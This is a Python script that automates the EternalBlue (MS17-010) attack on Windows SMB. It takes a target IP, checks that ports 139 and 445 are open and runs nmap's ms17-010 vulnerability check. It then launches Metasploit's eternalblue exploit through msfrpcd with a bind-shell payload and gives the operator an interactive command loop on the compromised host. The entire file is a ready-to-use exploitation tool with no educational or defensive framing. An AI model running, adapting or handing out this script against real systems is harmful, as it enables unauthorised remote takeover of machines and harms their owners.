#!/usr/bin/python
import socket;
import nmap;
import os;
import sys;
from subprocess import call;
from metasploit.msfrpc import MsfRpcClient
import time;
IP = raw_input("\nEnter the IP address:");
ports = [139, 445]

nm = nmap.PortScanner()

def scan(host, port):
	try:
		connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM,0)
		connection.connect((host, port))
		return True
	except:
		return False

for port in ports[:]:
	if scan(IP, port):
		print "Port", port, "is open"
	else:
		print "Port", port, "is closed"

print "\n-------------------------------------------------------------------"
check = raw_input("Verify whether the system is vulnerable to EternalBlue exploit(Y/N): ");

if check == 'Y' or check == 'y':
	try:
		print "-------------------------------------------------------------------"
		output = nm.scan(hosts=IP, arguments='-p445 --script smb-vuln-ms17-010')
		print nm[IP]['hostscript'][0]['output']
	except:
		print "The system is not vulnerable to EternalBlue exploit"
		exit()
else:
	exit()
exploit = raw_input("\nProceed to exploit the system(Y/N): ");

if exploit == 'Y' or exploit == 'y':
	try:
		os.system(' pkill -f "msfrpcd" ')
		os.system('msfrpcd -P password -n -S -a 127.0.0.1')
		print "Exploitation started.......\n"
		time.sleep(20)
		client = MsfRpcClient("password", server="127.0.0.1", ssl=False)
		exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
		exploit['RHOST'] = IP
		print "The session details are:", exploit.execute(payload='generic/shell_bind_tcp')
		interact = raw_input("\nProceed to interact with the shell(Y/N): ")
		if interact == 'Y' or interact == 'y':
			time.sleep(60)
			shell = client.sessions.session(1)
			while True:
				commands = raw_input("Enter a command, Ex: ipconfig, cd, etc,.: ")
				if commands == "":
					exit()
				else:
                                        shell.write(commands)
                                        print shell.read()
                                        continue

		else:
			exit()

	except Exception as e:
		print(e)
		exit()
else:
	exit()

